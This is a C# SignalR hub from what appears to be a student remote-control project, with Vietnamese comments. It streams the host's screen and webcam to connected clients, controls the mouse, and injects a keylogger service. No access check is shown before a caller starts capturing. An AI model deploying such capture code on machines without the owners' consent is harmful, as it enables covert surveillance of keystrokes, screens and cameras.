using Microsoft.AspNetCore.SignalR;
using Microsoft.Extensions.Hosting;
using server_os.Services; // <--- QUAN TRỌNG: Phải khớp namespace với 2 file trên
using System.Collections.Concurrent;
using System.Text.Json.Serialization;

namespace server_os.Hubs
{
    public class ClientInfo
    {
        public string ConnectionId { get; set; } = "";
        public string IpAddress { get; set; } = "";
        public string Name { get; set; } = "";
    }

    public class VirtualCursor
    {
        public int X { get; set; }
        public int Y { get; set; }
        public string ClientId { get; set; } = "";
    }

    public class ScrollData
    {
        [JsonPropertyName("deltaY")]
        public double DeltaY { get; set; }
    }

    public class SystemHub : Hub
    {
        private readonly KeyloggerService _keylogger;
        private readonly SystemActionService _systemAction;
        private readonly WebcamService _webcamService;
        private readonly ScreenStreamService _screenService;
        private readonly InputControlService _inputService;
        private readonly IHostApplicationLifetime _appLifetime;
        private readonly IHubContext<SystemHub> _hubContext;

        private static ConcurrentDictionary<string, ClientInfo> _onlineClients = new ConcurrentDictionary<string, ClientInfo>();
        private static bool _isSystemLocked = false;
        private static bool _isScreenSharing = false;
        private static CancellationTokenSource? _screenShareToken;

        // Constructor: Inject các Service
        public SystemHub(
            KeyloggerService keylogger,
            SystemActionService systemAction,
            WebcamService webcamService,
            ScreenStreamService screenService,
            InputControlService inputService,
            IHostApplicationLifetime appLifetime,
            IHubContext<SystemHub> hubContext)
        {
            _keylogger = keylogger;
            _systemAction = systemAction;
            _webcamService = webcamService;
            _screenService = screenService;
            _inputService = inputService;
            _appLifetime = appLifetime;
            _hubContext = hubContext;
        }

        // ======================= ULTRAVIEW (SCREEN SHARE) =======================
        public async Task StartScreenShare()
        {
            if (CheckLock()) return;
            if (_isScreenSharing) return;

            _isScreenSharing = true;
            _screenShareToken = new CancellationTokenSource();
            var token = _screenShareToken.Token;
            string currentClientId = Context.ConnectionId;

            await LogAction("Started UltraView Screen Share");

            _ = Task.Run(async () =>
            {
                while (!token.IsCancellationRequested && _isScreenSharing)
                {
                    try
                    {
                        var base64 = _screenService.CaptureScreenBase64();
                        if (!string.IsNullOrEmpty(base64))
                        {
                            // Gửi sự kiện "ReceiveScreenshot" về Client (khớp với code Frontend)
                            await _hubContext.Clients.Client(currentClientId).SendAsync("ReceiveScreenshot", base64);
                        }
                    }
                    catch { }
                    await Task.Delay(50); // ~20 FPS
                }
            }, token);
        }

        public async Task StopScreenShare()
        {
            _isScreenSharing = false;
            _screenShareToken?.Cancel();
            _inputService.ReleaseModifiers();
            await LogAction("Stopped UltraView Screen Share");
        }

        // ======================= INPUT CONTROL =======================
        // Hàm nhận tọa độ từ Client (đã tính theo pixel) và di chuyển chuột
        // Client gửi: socket.invoke("SendMouseMove", targetId, x, y)
        // Chúng ta map nó vào hàm này:
        public Task SendMouseMove(string targetId, double x, double y)
        {
            if (CheckLock()) return Task.CompletedTask;
            // Lưu ý: Client của bạn đang gửi toạ độ tỉ lệ (0.0-1.0), ta cần nhân với độ phân giải màn hình Server
            // Tuy nhiên, InputControlService.MoveMouse đang nhận int x, int y trực tiếp (SetCursorPos).
            // Ta cần sửa lại logic này một chút để khớp.
            
            // Giả sử màn hình server là 1920x1080 (hoặc lấy từ Screen.PrimaryScreen)
            int screenW = 1920; 
            int screenH = 1080;
            
            // Ép kiểu về int pixel
            int pixelX = (int)(x * screenW);
            int pixelY = (int)(y * screenH);

            _inputService.MoveMouse(pixelX, pixelY);
            return Task.CompletedTask;
        }

        public Task SendMouseClick(string targetId, string button)
        {
            if (!CheckLock())
            {
                if (button == "left") _inputService.ClickLeft();
                else if (button == "right") _inputService.ClickRight();
            }
            return Task.CompletedTask;
        }

        public Task SendKeyPress(string targetId, string key)
        {
            // Client gửi chuỗi key ("a", "Enter"...), cần map sang byte code nếu InputService nhận byte
            // Để đơn giản, ta chỉ log hoặc xử lý cơ bản ở đây nếu chưa map
            return Task.CompletedTask;
        }

        // ======================= SYSTEM & WEBCAM (GIỮ NGUYÊN) =======================
        public async Task GetWebcams()
        {
            if (CheckLock()) return;
            var list = _webcamService.GetCameraList();
            await Clients.Caller.SendAsync("ReceiveWebcamList", list);
        }

        public async Task StartWebcam(int camIndex)
        {
            if (CheckLock()) return;
            _webcamService.StartStream(camIndex, Context.ConnectionId);
            await LogAction($"Started Webcam Stream (Index: {camIndex})");
        }

        public async Task StopWebcam()
        {
            _webcamService.StopStream();
            await LogAction("Stopped Webcam Stream");
        }

        // ======================= CONNECTION & UTILS =======================
        public override async Task OnConnectedAsync()
        {
            string id = Context.ConnectionId;
            string ip = GetIpAddress();
            string name = ip == "127.0.0.1" ? "HOST (DASHBOARD)" : $"CLIENT-{id.Substring(0,4)}";

            _onlineClients[id] = new ClientInfo { ConnectionId = id, IpAddress = ip, Name = name };
            await Clients.Caller.SendAsync("UpdateSystemStatus", _isSystemLocked);
            await BroadcastClientList();
            await base.OnConnectedAsync();
        }

        public override async Task OnDisconnectedAsync(Exception? exception)
        {
            string id = Context.ConnectionId;
            _webcamService.StopStream();
            if (_isScreenSharing) await StopScreenShare();
            _onlineClients.TryRemove(id, out _);
            await BroadcastClientList();
            await base.OnDisconnectedAsync(exception);
        }

        private async Task BroadcastClientList() => await Clients.All.SendAsync("UpdateClientList", _onlineClients.Values.ToList());
        
        // Helper: Tương thích với Client cũ (AgentSelector)
        public async Task GetAgents()
        {
             var selfAgent = new [] { new { id = Context.ConnectionId, name = Environment.MachineName, status = "Online" } };
             await Clients.Caller.SendAsync("UpdateClientList", selfAgent);
        }

        private bool CheckLock() => _isSystemLocked;
        private async Task LogAction(string msg) => await Clients.All.SendAsync("ReceiveLog", msg);
        private async Task SendError(string msg) => await Clients.Caller.SendAsync("ReceiveLog", $"[BLOCKED] {msg}");
        private string GetIpAddress() => Context.GetHttpContext()?.Connection.RemoteIpAddress?.ToString() ?? "Unknown";
    }
}